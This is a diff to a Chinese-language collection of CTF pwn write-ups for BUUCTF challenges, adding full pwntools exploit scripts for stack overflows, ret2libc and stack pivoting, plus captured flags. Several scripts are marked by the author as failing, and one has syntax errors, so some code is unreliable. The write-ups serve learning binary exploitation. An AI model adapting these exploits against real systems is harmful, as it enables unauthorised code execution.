@@ -28,7 +28,7 @@ from pwn import *
 p = remote('node3.buuoj.cn', 28957)
 
 #payload = 'a' * (0xf + 0x8) + p64(0x401198) + p64(0x401186) 也可以，是网上wp的修改
-payload = 'a' * 15 + p64(0x401186).decode('unicode_escape')
+payload = b'a' * 15 + p64(0x401186)
 
 p.sendline(payload)
 
@@ -67,7 +67,7 @@ from pwn import *
 
 p = remote('node5.buuoj.cn', 28758)
 
-payload = 'a' * (64+8) + p64(0x00400611).decode('unicode_escape')
+payload = b'a' * (64+8) + p64(0x00400611)
 
 p.sendline(payload)
 
@@ -109,7 +109,7 @@ from pwn import *
 
 p = remote('node5.buuoj.cn', 26100)
 
-payload = 'a' * (0x30 - 0x04) + p64(0x41348000).decode('unicode_escape')
+payload = b'a' * (0x30 - 0x04) + p64(0x41348000)
 
 p.sendline(payload)
 
@@ -165,7 +165,7 @@ from pwn import *
 
 p = remote('node5.buuoj.cn', 29315)
 
-payload = 'I' * 20  + 'a' * 4 + p32(0x08048F13).decode('unicode_escape')
+payload = b'I' * 20  + b'a' * 4 + p32(0x08048F13)
 
 p.sendline(payload)
 
@@ -199,7 +199,7 @@ from pwn import *
 
 p = remote('node5.buuoj.cn', 26231)
 
-payload = 'a' * (128+8)  + p64(0x0040059A).decode('unicode_escape')
+payload = b'a' * (128+8)  + p64(0x0040059A)
 
 p.sendline(payload)
 
@@ -227,7 +227,7 @@ main函数里面可以看到对read等函数进行了限制：
 
 %n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置
 
-例如：printf("0x44444444%2$n")意思就是说在打印出0x4444这个字符后，将“0x44444444”所输入的字符数量（此处是4）写入到%2$n所指的地址中.
+例如：printf("0x44444444%2\$n")意思就是说在打印出0x4444这个字符后，将“0x44444444”所输入的字符数量（此处是4）写入到%2$n所指的地址中.
 
 
 
@@ -334,7 +334,7 @@ r = remote('node5.buuoj.cn',29222)
 hint = 0x804A024
 system = 0x8048320
 
-payload = 'a' * (0x88 + 0x04) + (p32(system) + p32(0) + p32(hint)).decode('unicode_escape')
+payload = b'a' * (0x88 + 0x04) + p32(system) + p32(0) + p32(hint)
 
 r.sendline(payload)
 
@@ -383,7 +383,7 @@ from pwn import *
 
 r = remote('node5.buuoj.cn',25756)
 
-payload = 'a' * (13*4)   +  (p32(0x11) + p32(0)).decode('unicode_escape')
+payload = b'a' * (13*4)   +  p32(0x11) + p32(0)
 
 r.sendline(payload)
 
@@ -429,7 +429,7 @@ r = remote('node5.buuoj.cn',29674)
 
 backdoor = 0x004006EA
 
-payload = 'a' * (0x10 + 0x08)   +  (p64(backdoor)).decode('unicode_escape')
+payload = b'a' * (0x10 + 0x08)   +  p64(backdoor)
 
 r.sendline(str(255))
 
@@ -669,6 +669,8 @@ read 100,name在.bss区，gets没有作出限制，所以可以轻松的溢出�
 
 
 
+本地打通
+
 ```python
 # -*- coding: utf-8 -*-
 from pwn import *
@@ -736,5 +738,575 @@ payload =b'a'*(0x20 +8) +p64(ret_addr) +p64(rdi_addr) +p64(name_addr) +p64(syste
  
 p.sendlineafter(b'me?\n',payload)
 p.interactive()
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+## jarvisoj_level2_x64
+
+
+
+checksec 一下 file一下
+
+```
+helloctfos@Hello-CTF:~/pwnenv$ checksec level2_x64
+[*] '/home/helloctfos/pwnenv/level2_x64'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+helloctfos@Hello-CTF:~/pwnenv$ file level2_x64
+level2_x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=17f0f0026ee70f2e0c8c600edcbe06862a9845bd, not stripped
+```
+
+
+
+ida里面啥都有了
+
+```
+binsh_addr = 0x600A90
+system_plt = 0x4004C0
+```
+
+
+
+但需要注意题目说的是x64，所以要使用rdi进行传参，栈平衡
+
+```
+pop_rdi_ret = 0x4006b3 
+```
+
+
+
+`buf` ,ida里面时128
+
+
+
+```python
+from pwn import *
+context(arch='amd64',os='linux',log_level='debug')
+
+ip = 'node5.buuoj.cn'
+port = 27984
+
+# io = process("./level2_x64")
+
+io = remote(ip,port)
+binsh_addr = 0x600A90
+system_plt = 0x4004C0
+pop_rdi_ret = 0x4006b3
+
+payload = b'a' * 0x88
+payload += p64(pop_rdi_ret)
+payload += p64(binsh_addr)
+payload += p64(system_plt)
+
+io.sendline(payload)
+io.interactive()
+```
+
+
+
+本地打不通，但是远程打通了，本地应该是缺少什么文件
+
+
+
+
+
+## [OGeek2019]babyrop（libc打不通）
+
+
+
+```
+helloctfos@Hello-CTF:~/pwnenv$ checksec pwn
+[*] '/home/helloctfos/pwnenv/pwn'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+helloctfos@Hello-CTF:~/pwnenv$ file pwn
+pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped
+```
+
+
+
+
+
+ida查看
+
+
+
+
+
+核心部分：
+
+s和v1比较，也就是a1和v1比较，\x00截断绕过strncmp
+
+```
+int __cdecl sub_804871F(int a1)
+{
+  size_t v1; // eax
+  char s[32]; // [esp+Ch] [ebp-4Ch] BYREF
+  char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF
+  ssize_t v5; // [esp+4Ch] [ebp-Ch]
+
+  memset(s, 0, sizeof(s));
+  memset(buf, 0, sizeof(buf));
+  sprintf(s, "%ld", a1);
+  v5 = read(0, buf, 0x20u);
+  buf[v5 - 1] = 0;
+  v1 = strlen(buf);
+  if ( strncmp(buf, s, v1) )
+    exit(0);
+  write(1, "Correct\n", 8u);
+  return (unsigned __int8)buf[7];
+}
+```
+
+
+
+看样子就是要构造buf[7]的值，buf[7]传进来就是a1了
+
+```
+ssize_t __cdecl sub_80487D0(char a1)
+{
+  char buf[231]; // [esp+11h] [ebp-E7h] BYREF
+
+  if ( a1 == 127 )
+    return read(0, buf, 200u);
+  else
+    return read(0, buf, a1);
+}
+```
+
+
+
+然后后面就是ret2libc
+
+
+
+打不通
+
+```python
+from pwn import *
+from LibcSearcher import *
+context(arch='i386',os='linux',log_level='debug')
+# io = process('./pwn')
+
+ip='node5.buuoj.cn'
+port = 26505
+
+io = remote(ip,port)
+elf = ELF('./pwn')
+
+puts_plt = elf.plt['puts'] 
+puts_got = elf.got['puts']
+
+main_addr = 0x08048825
+
+payload1 = b'\x00' + b'a'*6 + b'\xff'
+
+io.sendline(payload1)
+
+payload2 = b'a'*(0xe7+0x04) + p32(puts_plt) + p32(main_addr) + p32(puts_got)
+
+io.sendafter(b'Correct\n',payload2)
+
+puts_addr = u32(io.recv(4))
+
+libc = LibcSearcher('puts',puts_addr)
+
+libc_base = puts_addr - libc.dump('puts')
+
+system_addr = libc_base + libc.dump('system')
+
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+io.sendline(payload1)
+
+payload3 = b'a'*(0xe7+0x04) + p32(system_addr) + p32(0) + p32(binsh_addr)
+
+io.sendafter(b'Correct\n',payload3)
+
+io.interactive()
+```
+
+
+
+
+
+
+
+
+
+## jarvisoj_level3（libc版本）打不通
+
+
+
+```
+helloctfos@Hello-CTF:~/pwnenv$ checksec level3 && file level3
+[*] '/home/helloctfos/pwnenv/level3'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+level3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44a438e03b4d2c1abead90f748a4b5500b7a04c7, not stripped
+```
+
+
+
+
+
+经典的ret2libc
+
+
+
+```c
+ssize_t vulnerable_function()
+{
+  char buf[136]; // [esp+0h] [ebp-88h] BYREF
+
+  write(1, "Input:\n", 7u);
+  return read(0, buf, 256u);
+}
+```
+
+
+
+直接写exp就可以了
+
+先write got地址
+
+```python
+from pwn import *
+
+from LibcSearcher import *
+
+context(arch="i386",os='linux',log_level='debug')
+
+io = remote('node5.buuoj.cn',25059)
+
+# io = process("./level3")
+
+elf = ELF("./level3")
+
+write_plt=elf.plt['write']
+
+write_got=elf.got['write']
+
+main_addr=elf.symbols['main']
+
+payload= b'a'*140+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)
+
+#  write(1,address,len)
+
+io.sendafter(b"Input:\n",payload)
+
+write_addr = u32(io.recv(4))
+
+libc=LibcSearcher('write',write_addr)
+
+libcbase=write_addr-libc.dump("write")
+
+system_addr=libcbase+libc.dump("system")
+
+binsh_addr=libcbase+libc.dump("str_bin_sh")
+
+payload_exp= b'a'*140 + p32(system_addr) + p32(0) + p32(binsh_addr)
+
+io.sendline(payload_exp)
+
+io.interactive()
+```
+
+
+
+## others_shellcode
+
+nc连上，直接cat flag就有
+
+```
+flag{1a434df0-dc6d-4af5-a673-5ed91bf63169}
+```
+
+
+
+## jarvisoj_tell_me_something
+
+64位nx
+
+
+
+read有个栈溢出，136
+
+```
+pwndbg> cyclic -l 0x6161616161616172
+Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
+Found at offset 136
+```
+
+
+
+然后有一个goodgame
+
+```
+int good_game()
+{
+  FILE *v0; // rbx
+  int result; // eax
+  char buf[9]; // [rsp+Fh] [rbp-9h] BYREF
+
+  v0 = fopen("flag.txt", "r");
+  while ( 1 )
+  {
+    result = fgetc(v0);
+    buf[0] = result;
+    if ( (_BYTE)result == 0xFF )
+      break;
+    write(1, buf, 1uLL);
+  }
+  return result;
+}
+```
+
+```
+good_game_addr = 0x400620
+```
+
+
+
+直接写exp：
+
+```python
+from pwn import *
+
+io = remote('node5.buuoj.cn',26803)
+
+# io = process("./guestbook")
+
+good_game_addr = 0x400620
+
+payload = b'a'*136 + p64(good_game_addr)
+
+io.recvuntil(b'Input your message:\n')
+
+io.sendline(payload)
+
+io.interactive()
+```
+
+
+
+
+
+连上就有;
+
+```
+flag{572bd1b5-6b92-4efa-962a-620e02e3302f}
+```
+
+
+
+
+
+## ciscn_2019_ne_5
+
+32位nx
+
+
+
+看main函数吓死人，还以为是堆题
+
+
+
+有一个比较
+
+```
+strcmp(s1, "administrator")
+```
+
+
+
+Getflag函数里面有一个strcpy栈溢出
+
+函数里面没有/bin/sh，但是可以查找后缀为sh的，也是可以利用
+
+```
+LOAD:080482E6 aFflush         db 'fflush',0   
+```
+
+有system
+
+src参数通用
+
+
+
+exp：
+
+不要用`p32(0)` 因为有`strcpy`函数
+
+```python
+from pwn import *
+
+# io = process("./ciscn_2019_ne_5")
+
+io = remote('node5.buuoj.cn',28698)
+
+binsh_addr = 0x80482E6 + 4
+
+system_addr=0x80484D0
+
+io.recvuntil(b"Please input admin password:")
+
+io.sendline(b'administrator')
+
+io.recvuntil(b"Input your operation:")
+
+io.sendline(b'1')
+
+payload = b'a'*(0x48 + 0x04) + p32(system_addr) + b'a'*4 + p32(binsh_addr)
+
+io.recvuntil(b"Please input new log info:")
+
+io.sendline(payload)
+
+io.recvuntil(b"Input your operation:")
+
+io.sendline(b'4')
+
+io.interactive()
+```
+
+
+
+拿到flag
+
+```
+flag{79a5a4fa-ab09-42f1-baef-54ba7e312d57}
+```
+
+
+
+## ciscn_2019_es_2(未完成)
+
+[[原创\]ciscn_2019_es_2栈转移-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-269163.htm)
+
+32位nx，partial
+
+
+
+
+
+核心：
+
+```
+int vul()
+{
+  char s[40]; // [esp+0h] [ebp-28h] BYREF
+
+  memset(s, 0, 0x20u);
+  read(0, s, 0x30u);
+  printf("Hello, %s\n", s);
+  read(0, s, 0x30u);
+  return printf("Hello, %s\n", s);
+}
+```
+
+
+
+有个system直接echo flag，却是假的
+
+但是有system
+
+```
+system_plt = 0x08048400
+```
+
+
+
+有溢出，但不多
+
+
+
+
+
+exp：
+
+```python
+from pwn import *
+
+context(arch='i386',os='linux',log_level='debug')
+
+io = process('./ciscn')
+
+system_addr = 0x08048400
+
+leave_ret = 0x080484b8
+
+payload ='a'*0x20+'bbbbbbbb'
+
+io.send(payload)
+
+io.recvuntil('bbbbbbbb')
+
+leak_addr = u32(io.recv(4))
+
+payload2 =(b'aaaa'+p32(system_addr)+b'aaaa'+p32(leak_addr-0x28)+b'/bin/sh\x00').ljust(0x28,'a')
+
+payload2+=p32(leak_addr-0x38)+p32(leave_ret)
+
+io.sendline(payload2)
+
+io.interactive()
+```
+
+
+
+
+
+
+
+```python
+from pwn import *
+
+io=process('./ciscn_2019_es_2')
+
+payload=b'a'4+b'b'0x20+b'c'*4
+
+io.recvuntil('name?\n')
+
+io.send(payload)
+
+io.recvuntil('cccc')
+
+addr=u32(io.recv(4))
+
+systeam_addr=0x08048400
+
+leave_ret_addr=0x080485FD
+
+payload2=b'a'*4
+
+payload2+=p32(systeam_addr)
+payload2+=p32(0xdeadbeef)
+payload2+=p32(addr-0x38+0x10)+b"/bin/sh"
+payload2=payload2.ljust(0x28,b'\x00')
+payload2+=p32(addr-0x38)
+payload2+=p32(leave_ret_addr)
+io.send(payload2)
+io.interactive()
 ```
 
